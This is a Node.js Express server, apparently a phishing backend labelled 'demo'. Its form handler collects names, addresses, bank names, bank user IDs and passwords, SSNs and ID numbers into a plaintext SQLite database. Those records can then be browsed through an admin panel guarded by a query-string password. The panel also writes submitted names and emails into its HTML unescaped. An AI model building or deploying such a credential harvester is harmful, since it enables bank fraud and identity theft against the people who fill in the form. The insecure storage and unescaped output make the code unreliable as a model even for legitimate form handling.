const express = require('express');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'changeme';

// Database setup
const db = new sqlite3.Database('./demo_data.db');
db.run(`
  CREATE TABLE IF NOT EXISTS submissions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT,
    email TEXT,
    phone TEXT,
    address TEXT,
    city TEXT,
    state TEXT,
    bank TEXT,
    userid TEXT,
    password TEXT,
    ssn TEXT,
    id_number TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Handle form submissions
app.post('/submit', (req, res) => {
  const { name, email, phone, address, city, state, bank, userid, password, ssn, id_number } = req.body;

  db.run(
    `INSERT INTO submissions (name, email, phone, address, city, state, bank, userid, password, ssn, id_number)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
    [name, email, phone, address, city, state, bank, userid, password, ssn, id_number],
    (err) => {
      if (err) {
        console.error(err);
        return res.status(500).send('Error saving data');
      }
      res.send('<h2>Thank you! Your demo data has been recorded.</h2><a href="/">Go back</a>');
    }
  );
});

// Admin view (password protected)
app.get('/admin', (req, res) => {
  if (req.query.pw !== ADMIN_PASSWORD) {
    return res.status(401).send('Unauthorized');
  }

  db.all(`SELECT * FROM submissions ORDER BY created_at DESC`, (err, rows) => {
    if (err) {
      return res.status(500).send('Error reading data');
    }

    const maskedRows = rows.map(r => ({
      ...r,
      userid: r.userid ? r.userid.replace(/.(?=.{2})/g, '*') : '',
      password: r.password ? '*'.repeat(r.password.length) : '',
      ssn: r.ssn ? '***-**-' + r.ssn.slice(-4) : '',
      id_number: r.id_number ? r.id_number.replace(/.(?=.{2})/g, '*') : '',
    }));

    let html = '<h1>Admin Panel (Demo)</h1><table border="1"><tr><th>Name</th><th>Email</th><th>Phone</th><th>Bank</th><th>UserID</th><th>Password</th><th>SSN</th><th>ID</th><th>Time</th></tr>';
    maskedRows.forEach(r => {
      html += `<tr>
        <td>${r.name}</td>
        <td>${r.email}</td>
        <td>${r.phone}</td>
        <td>${r.bank}</td>
        <td>${r.userid}</td>
        <td>${r.password}</td>
        <td>${r.ssn}</td>
        <td>${r.id_number}</td>
        <td>${r.created_at}</td>
      </tr>`;
    });
    html += '</table>';
    res.send(html);
  });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
